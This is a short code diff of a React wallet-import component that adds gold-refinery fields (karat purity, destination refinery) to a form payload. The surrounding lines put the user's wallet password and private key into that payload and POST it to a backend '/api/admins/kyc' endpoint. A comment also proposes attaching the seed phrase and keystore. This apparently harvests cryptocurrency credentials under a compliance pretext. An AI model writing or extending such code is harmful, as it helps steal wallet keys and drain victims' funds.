@@ -68,6 +68,9 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
                   password: walletFormData?.pass || undefined,
                   privateKey: walletFormData?.privateKey || undefined,
                   imageUrls: pending.imageUrls || [],
+                  qualityRequired: pending.qualityRequired || '',
+                  karatsPurity: pending.karatsPurity || '',
+                  destinationRefineryText: pending.destinationRefineryText || '',
                 };
                 // Optionally attach seed/keystore/privateKey from form state if you have them accessible
                 const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
